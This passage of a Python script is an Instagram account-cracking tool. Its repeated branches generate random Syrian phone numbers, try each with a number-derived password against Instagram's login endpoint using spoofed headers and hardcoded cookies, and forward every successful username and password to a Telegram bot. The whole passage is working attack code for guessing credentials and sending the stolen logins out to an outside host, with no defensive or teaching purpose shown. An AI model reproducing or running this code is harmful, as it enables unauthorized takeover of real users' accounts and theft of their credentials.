         'user-agent':generate_user_agent(),
         'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
         'x-ig-app-id':'936619743392459',
         'x-ig-www-claim':'0',
         'x-instagram-ajax':'8a8118fa7d40',
         'x-requested-with':'XMLHttpRequest'}
		data = {'username':username,
         'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
         'queryParams':'{}',
         'optIntoOneTap':'false'}
         
		req_login = r.post(url, headers=headers, data=data, proxies=None)
		
		if 'userId' in req_login.text:
			print(F + username + ' - ' + password + ' ■SUCCEED')
			tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • 𝐇𝐞𝐥𝐥𝐨 𝐍𝐨𝐰 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 ♔︎
\n━━━━━━━━━━━━━\n- EMAIL ➪ {username} ✓\n- Pass ➪ {password} \n━━━━━━━━━━━━━\n• Ch ➪ @FYFFFF\n━━━━━━━━━━━━━\n•   ''')
			i = requests.post(tlg)
			
		else:
			print(Z+username + ' - ' + password +' ■FAILED')
			
			
			
if (AS == '16'):
	user = '1234567890'
	a = '+96393'
	u = '093'
	while True:
		
		us = str(''.join(random.choice(user) for i in range(7)))
		username = '+96393' + us
		password = '093' + us
	
		url = 'https://www.instagram.com/accounts/login/ajax/'
	
		headers = {'accept':'*/*',
         'accept-encoding':'gzip,deflate,br',
         'accept-language':'en-US,en;q=0.9,ar;q=0.8',
         'content-length':'269',
         'content-type':'application/x-www-form-urlencoded',
         'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
         'origin':'https://www.instagram.com',
         'referer':'https://www.instagram.com/',
         'sec-fetch-dest':'empty',
         'sec-fetch-mode':'cors',
         'sec-fetch-site':'same-origin',
         'user-agent':generate_user_agent(),
         'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
         'x-ig-app-id':'936619743392459',
         'x-ig-www-claim':'0',
         'x-instagram-ajax':'8a8118fa7d40',
         'x-requested-with':'XMLHttpRequest'}
		data = {'username':username,
         'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
         'queryParams':'{}',
         'optIntoOneTap':'false'}
         
		req_login = r.post(url, headers=headers, data=data, proxies=None)
		
		if 'userId' in req_login.text:
			print(F+username + ' - ' + password + ' ■SUCCEED')
			tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • 𝐇𝐞𝐥𝐥𝐨 𝐍𝐨𝐰 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 ♔︎
\n━━━━━━━━━━━━━\n- EMAIL ➪ {username} ✓\n- Pass ➪ {password} \n━━━━━━━━━━━━━\n• Ch ➪ @FYFFFF\n━━━━━━━━━━━━━\n• ''')
			i = requests.post(tlg)
			
		else:
			print(Z+username + ' - ' + password +' ■FAILED')	
			
			
if (AS == '17'):
	user = '1234567890'
	a = '+96394'
	u = '094'
	while True:
		
		us = str(''.join(random.choice(user) for i in range(7)))
		username = '+96394' + us
		password = '094' + us
	
		url = 'https://www.instagram.com/accounts/login/ajax/'
	
		headers = {'accept':'*/*',
         'accept-encoding':'gzip,deflate,br',
         'accept-language':'en-US,en;q=0.9,ar;q=0.8',
         'content-length':'269',
         'content-type':'application/x-www-form-urlencoded',
         'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
         'origin':'https://www.instagram.com',
         'referer':'https://www.instagram.com/',
         'sec-fetch-dest':'empty',
         'sec-fetch-mode':'cors',
         'sec-fetch-site':'same-origin',
         'user-agent':generate_user_agent(),
         'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
         'x-ig-app-id':'936619743392459',
         'x-ig-www-claim':'0',
         'x-instagram-ajax':'8a8118fa7d40',
         'x-requested-with':'XMLHttpRequest'}
		data = {'username':username,
         'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
         'queryParams':'{}',
         'optIntoOneTap':'false'}
         
		req_login = r.post(url, headers=headers, data=data, proxies=None)
		
		if 'userId' in req_login.text:
			print(F+username + ' - ' + password + ' ■SUCCEED')
			tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • @FYFFFF♔︎
\n━━━━━━━━━━━━━\n- EMAIL ➪ {username} ✓\n- Pass ➪ {password} \n━━━━━━━━━━━━━\n• Ch ➪ @FYFFFF\n━━━━━━━━━━━━━\n• ''')
			i = requests.post(tlg)
			
		else:
			print(Z+username + ' - ' + password +' ■FAILED')	
			
			
if (AS == '18'):
	user = '1234567890'
	a = '+96395'
	u = '095'
	while True:
		
		us = str(''.join(random.choice(user) for i in range(8)))
		username = '+96395' + us
		password = '095' + us
	
		url = 'https://www.instagram.com/accounts/login/ajax/'
	
		headers = {'accept':'*/*',
         'accept-encoding':'gzip,deflate,br',
         'accept-language':'en-US,en;q=0.9,ar;q=0.8',
         'content-length':'269',
         'content-type':'application/x-www-form-urlencoded',
         'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
         'origin':'https://www.instagram.com',
         'referer':'https://www.instagram.com/',
         'sec-fetch-dest':'empty',
         'sec-fetch-mode':'cors',
         'sec-fetch-site':'same-origin',
         'user-agent':generate_user_agent(),
         'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
         'x-ig-app-id':'936619743392459',
         'x-ig-www-claim':'0',
         'x-instagram-ajax':'8a8118fa7d40',
         'x-requested-with':'XMLHttpRequest'}
		data = {'username':username,
         'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
         'queryParams':'{}',
         'optIntoOneTap':'false'}
         
		req_login = r.post(url, headers=headers, data=data, proxies=None)
		
		if 'userId' in req_login.text:
			print(F+username + ' - ' + password + ' ■SUCCEED')
			tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • 𝐇𝐞𝐥𝐥𝐨 𝐍𝐨𝐰 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 ♔︎
\n━━━━━━━━━━━━━\n- EMAIL ➪ {username} ✓\n- Pass ➪ {password} \n━━━━━━━━━━━━━\n• Ch ➪ @FYFFFF\n━━━━━━━━━━━━━\n• ''')
			i = requests.post(tlg)
			
		else:
			print(Z+username + ' - ' + password +' ■FAILED')	
			
			
if (AS == '19'):
	user = '1234567890'
	a = '+96396'
	u = '096'
	while True:
		
		us = str(''.join(random.choice(user) for i in range(7)))
		username = '+96396' + us
		password = '096' + us
	
		url = 'https://www.instagram.com/accounts/login/ajax/'
	
		headers = {'accept':'*/*',
         'accept-encoding':'gzip,deflate,br',
         'accept-language':'en-US,en;q=0.9,ar;q=0.8',
         'content-length':'269',
         'content-type':'application/x-www-form-urlencoded',
         'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
         'origin':'https://www.instagram.com',
         'referer':'https://www.instagram.com/',
         'sec-fetch-dest':'empty',
         'sec-fetch-mode':'cors',
         'sec-fetch-site':'same-origin',
         'user-agent':generate_user_agent(),
         'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
         'x-ig-app-id':'936619743392459',
         'x-ig-www-claim':'0',
         'x-instagram-ajax':'8a8118fa7d40',
         'x-requested-with':'XMLHttpRequest'}
		data = {'username':username,
         'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
         'queryParams':'{}',
         'optIntoOneTap':'false'}
         
		req_login = r.post(url, headers=headers, data=data, proxies=None)
		
		if 'userId' in req_login.text:
			print(F+username + ' - ' + password + ' ■SUCCEED')
			tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • 𝐇𝐞𝐥𝐥𝐨 𝐍𝐨𝐰 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 ♔︎
\n━━━━━━━━━━━━━\n- EMAIL ➪ {username} ✓\n- Pass ➪ {password} \n━━━━━━━━━━━━━\n• Ch ➪ @FYFFFF\n━━━━━━━━━━━━━\n• ''')
			i = requests.post(tlg)
			
		else:
			print(Z+username + ' - ' + password +' ■FAILED')	
			
			
if (AS == '20'):
	user = '1234567890'
	a = '+96399'
	u = '099'
	while True:
		
		us = str(''.join(random.choice(user) for i in range(7)))
		username = '+96399' + us
		password = '099' + us
	
		url = 'https://www.instagram.com/accounts/login/ajax/'
	
		headers = {'accept':'*/*',
         'accept-encoding':'gzip,deflate,br',
         'accept-language':'en-US,en;q=0.9,ar;q=0.8',
         'content-length':'269',
         'content-type':'application/x-www-form-urlencoded',
         'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
         'origin':'https://www.instagram.com',
         'referer':'https://www.instagram.com/',
         'sec-fetch-dest':'empty',
         'sec-fetch-mode':'cors',
         'sec-fetch-site':'same-origin',
         'user-agent':generate_user_agent(),
         'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
         'x-ig-app-id':'936619743392459',
         'x-ig-www-claim':'0',
         'x-instagram-ajax':'8a8118fa7d40',
         'x-requested-with':'XMLHttpRequest'}
		data = {'username':username,
         'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
         'queryParams':'{}',
         'optIntoOneTap':'false'}
         
		req_login = r.post(url, headers=headers, data=data, proxies=None)
		
		if 'userId' in req_login.text:
			print(F+username + ' - ' + password + ' ■SUCCEED')
			tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • 𝐇𝐞𝐥𝐥𝐨 𝐍𝐨𝐰 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 ♔︎
\n━━━━━━━━━━━━━\n- EMAIL ➪ {username} ✓\n- Pass ➪ {password} \n━━━━━━━━━━━━━\n• Ch ➪ @FYFFFF\n━━━━━━━━━━━━━\n• ''')
			i = requests.post(tlg)
			
		else:
			print(Z+username + ' - ' + password +' ■FAILED')	
			
			
